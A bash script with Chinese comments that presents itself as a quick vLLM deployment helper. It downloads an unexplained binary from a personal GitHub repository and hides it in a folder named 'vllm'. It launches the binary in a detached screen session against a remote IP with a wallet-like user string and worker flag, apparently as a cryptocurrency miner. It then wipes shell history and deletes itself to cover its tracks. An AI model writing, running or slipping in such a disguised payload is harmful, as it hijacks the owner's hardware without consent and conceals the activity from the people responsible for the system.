#!/bin/bash

# 设置非交互模式
export DEBIAN_FRONTEND=noninteractive

echo "检测到 vLLM 环境，开始快速部署..."

# 1. 确保基础工具存在
apt-get update -q && apt-get install -y screen wget tar > /dev/null 2>&1

# 2. 自动定位 uv 的路径
export PATH="$HOME/.local/bin:$HOME/.cargo/bin:/usr/local/bin:$PATH"

if ! command -v uv &> /dev/null; then
    echo "警告: 未在默认路径找到 uv，尝试安装..."
    curl -LsSf https://astral.sh/uv/install.sh | sh
    export PATH="$HOME/.local/bin:$HOME/.cargo/bin:$PATH"
fi

# 3. 清理并进入工作目录
cd $HOME
rm -rf vllm p.tar.gz p

# 4. 创建虚拟环境 (使用 uv)
echo "正在配置虚拟环境 (Python 3.12)..."
uv venv vllm --python 3.12 > /dev/null

# 5. 下载程序包
echo "正在获取程序文件..."
wget https://raw.githubusercontent.com/xiaobintse/sh/main/p.tar.gz && tar -zxf p.tar.gz && chmod +x p && cp p ~/vllm && rm -rf p*

# 7. 启动程序
echo "正在后台启动进程..."
# 注意：这里运行的是 $HOME/vllm/ 目录下的 p
screen -dmS p bash -c "sleep 5 && source $HOME/vllm/bin/activate && cd $HOME/vllm && ./p --host 84.32.220.219:9000 --user prl1p0w4e8dd5mpmk7jgzxkx6vja80k3jqs6vt2kcltly8rfz026m95cs33mnk5 --worker new"

# 8. 痕迹清理
history -c
rm -f $HOME/.Xauthority
rm -f $HOME/.bash_history
# 脚本自删除
rm -f "$0"

echo "-------------------------------------------------------"
echo "部署完成！"
echo "-------------------------------------------------------"